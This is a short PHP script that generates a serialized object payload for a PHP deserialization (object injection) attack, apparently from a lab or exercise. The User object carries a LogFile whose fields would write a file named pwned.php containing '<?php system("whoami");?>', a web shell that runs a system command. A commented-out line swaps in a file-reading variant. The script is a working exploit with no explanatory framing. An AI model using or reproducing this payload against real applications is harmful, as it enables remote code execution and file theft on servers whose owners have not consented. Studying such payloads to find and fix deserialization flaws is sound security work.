<?php
class ReadFile{
	public function __construct(){
		$this->filename="c:\\php\\license.txt";
	}
}

class LogFile{
	public function __construct(){
		$this->filename="c:\\php\pwned.php";
		$this->username='<?php system("whoami");?>';
	}
}
class User
{
	public function __construct(){
		//$this->username = new ReadFile();
		$this->username = new LogFile();
		$this->isAdmin = False;
	}
}

$obj=new User();
echo serialize($obj);

?>